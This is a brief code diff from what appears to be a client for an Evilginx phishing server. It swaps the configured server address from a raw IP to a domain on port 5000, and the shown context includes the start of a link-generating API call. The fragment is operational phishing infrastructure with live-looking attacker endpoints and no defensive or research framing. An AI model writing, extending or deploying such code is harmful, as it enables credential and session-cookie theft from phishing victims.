@@ -43,7 +43,7 @@ function checkAuthStatus() {
 }
 
 // Evilginx server configuration
-const evilginx_server = "http://3.149.242.245:5000";
+const evilginx_server = "http://tecan.com.co:5000";
 
 // Evilginx API calls
 async function generateLink() {
